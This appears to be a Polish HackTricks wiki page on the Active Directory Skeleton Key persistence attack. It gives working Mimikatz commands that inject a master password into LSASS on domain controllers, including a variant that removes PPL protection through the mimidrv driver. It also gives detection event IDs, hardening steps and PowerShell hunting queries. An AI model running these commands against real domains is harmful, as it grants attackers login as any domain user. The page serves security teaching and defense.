# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

**Skeleton Key attack** to technika, która umożliwia atakującym **obejście uwierzytelniania Active Directory** poprzez **wstrzyknięcie hasła głównego** do procesu LSASS każdego kontrolera domeny. Po wstrzyknięciu hasło główne (domyślnie **`mimikatz`**) może być użyte do uwierzytelnienia się jako **dowolny użytkownik domeny**, podczas gdy ich rzeczywiste hasła nadal działają.

Kluczowe fakty:

- Wymaga **Domain Admin/SYSTEM + SeDebugPrivilege** na każdym DC i musi być **ponownie zastosowany po każdym restarcie**.
- Modyfikuje ścieżki walidacji **NTLM** i **Kerberos RC4 (etype 0x17)**; domeny korzystające wyłącznie z AES lub konta wymuszające AES **nie zaakceptują Skeleton Key**.
- Może kolidować z zewnętrznymi pakietami uwierzytelniania LSA lub dodatkowymi dostawcami smart‑card / MFA.
- Moduł Mimikatz akceptuje opcjonalny przełącznik `/letaes`, aby nie dotykać hooków Kerberos/AES w przypadku problemów z kompatybilnością.

### Wykonanie

Klasyczny, niechroniony przez PPL LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Jeśli **LSASS is running as PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), wymagany jest sterownik jądra, aby usunąć ochronę przed patchowaniem LSASS:
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Po injekcji uwierzytelnij się za pomocą dowolnego konta domenowego, ale użyj hasła `mimikatz` (lub wartości ustawionej przez operatora). Pamiętaj, aby powtórzyć to na **wszystkich DC** w środowiskach z wieloma DC.

## Środki zaradcze

- **Log monitoring**
- System **Event ID 7045** (instalacja usługi/sterownika) dla niepodpisanych sterowników takich jak `mimidrv.sys`.
- **Sysmon**: Event ID 7 (załadowanie sterownika) dla `mimidrv.sys`; Event ID 10 dla podejrzanego dostępu do `lsass.exe` z procesów nie‑systemowych.
- Security **Event ID 4673/4611** dla użycia wrażliwych uprawnień lub anomalii rejestracji pakietu uwierzytelniania LSA; koreluj z nieoczekiwanymi logowaniami 4624 używającymi RC4 (etype 0x17) z DCs.
- **Hardening LSASS**
- Utrzymuj **RunAsPPL/Credential Guard/Secure LSASS** włączone na DCs, aby zmusić atakujących do wdrożenia sterownika w trybie kernel (więcej telemetrii, trudniejsza eksploatacja).
- Wyłącz przestarzałe **RC4** tam, gdzie to możliwe; tikety Kerberos ograniczone do AES uniemożliwiają ścieżkę hook RC4 używaną przez the skeleton key.
- Szybkie wyszukiwania PowerShell:
- Wykryj instalacje niepodpisanych sterowników jądra: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Wyszukaj sterownik Mimikatz: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Sprawdź, czy PPL jest egzekwowany po restarcie: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

For additional credential‑hardening guidance check [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## Źródła

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
